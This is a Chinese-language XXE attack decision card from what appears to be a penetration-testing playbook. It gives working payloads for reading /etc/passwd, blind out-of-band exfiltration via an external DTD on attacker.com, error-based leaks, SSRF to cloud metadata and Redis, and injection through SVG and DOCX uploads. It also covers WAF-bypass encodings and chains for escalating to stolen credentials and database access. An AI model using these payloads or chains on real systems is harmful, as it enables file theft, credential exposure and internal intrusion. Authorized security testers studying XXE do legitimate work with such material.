# XXE 决策卡 (Light Deep Card)

> **CWE**: 611 / 827 | **ROI**: 极高 (P0)
> **轻便原则**: 只放 XXE 高 ROI 路由: 经典文件读取 / Blind-OOB / SSRF 链。具体 DTD 变体不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 请求 Content-Type 为 `application/xml` / `text/xml` | XML 解析入口 | §1 |
| 请求含 SOAP Envelope | SOAP 服务 | §1 + SOAP 专用 |
| 响应含 XML 解析错误 | XXE 可能 | §1 探测 |
| Content-Type 非 XML 但接受 XML | 内容协商 | 试改 Content-Type |
| 上传 SVG / DOCX / XLSX | 嵌入 XXE | §4 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 1. 经典 XXE (有回显)

### 1.1 First-pass

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

响应中出现 `/etc/passwd` 内容 → 确认 XXE。Windows 用 `file:///C:/Windows/win.ini`。

### 1.2 参数实体 (普通实体被禁时)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://your-dnslog.cn/xxe.dtd">
  %dtd;
]>
<root>test</root>
```

DNSLog 收到请求即确认解析器支持外部实体。

---

## 2. Blind XXE (无回显)

### 2.1 OOB 外带

```xml
<!-- 攻击者服务器放 xxe.dtd -->
<!-- xxe.dtd: <!ENTITY % file SYSTEM "file:///etc/hostname"> -->
<!--          <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'http://attcker.com/?x=%file;'>"> -->
<!--          %eval; %oob; -->

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>test</root>
```

OOB 通道见 [../oob-infrastructure.md](../oob-infrastructure.md)。

### 2.2 Error-based

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

错误信息中泄露文件内容。

---

## 3. XXE → SSRF 链

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

- 云元数据 → [../cloud-security.md](../cloud-security.md)
- 内网端口探测 → 修改 URL 扫描内网服务
- Redis `http://127.0.0.1:6379/` → 可能未授权

---

## 4. 文件上传 XXE

| 文件类型 | 注入位置 |
|----------|----------|
| SVG | `<svg><text>&xxe;</text></svg>` |
| DOCX / XLSX / PPTX | 解压 → `word/document.xml` 或 `[Content_Types].xml` 注入 |
| XML 配置上传 | 直接注入 DOCTYPE |

---

## 5. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| `Entity not allowed` / `External entity forbidden` | 解析器禁用外部实体 | 试参数实体;试 UTF-16 编码绕 WAF |
| 响应完全无变化 | 盲 XXE 或解析器忽略 | OOB;Error-based |
| 只在 SOAP 中生效 | SOAP Body 是唯一被解析的 | 只在 SOAP Body 内注入 |
| WAF 拦截 `<!DOCTYPE` | 编码绕过 | UTF-16 / Base64 编码整个 XML |
| 文件上传后无解析 | 上传只是存储,不解析 | 转上传漏洞链 |

---

## 6. 级联

- XXE 读文件 → 找凭证/密钥 → [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- XXE → SSRF → 云元数据 → [../cloud-security.md](../cloud-security.md)
- XXE → SSRF → 内网服务 → [ssrf.md](ssrf.md)
- 读应用配置 → 数据库密码 → SQL 直连

---

## 7. 相关参考

- SSRF → [ssrf.md](ssrf.md)
- 文件上传 → [upload.md](upload.md)
- OOB 通道 → [../oob-infrastructure.md](../oob-infrastructure.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
